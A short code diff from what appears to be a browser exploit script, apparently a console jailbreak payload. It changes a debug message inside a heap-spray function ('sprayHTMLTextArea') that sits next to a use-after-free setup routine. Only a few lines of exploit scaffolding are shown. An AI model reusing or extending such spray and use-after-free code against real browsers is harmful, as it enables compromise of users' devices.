@@ -411,7 +411,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("[+] Spraying HTMLTextareaElement ...");
+	debug_log("PAYLODE MIRA-FIX KARO 7.02 LOADING ...");
 
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
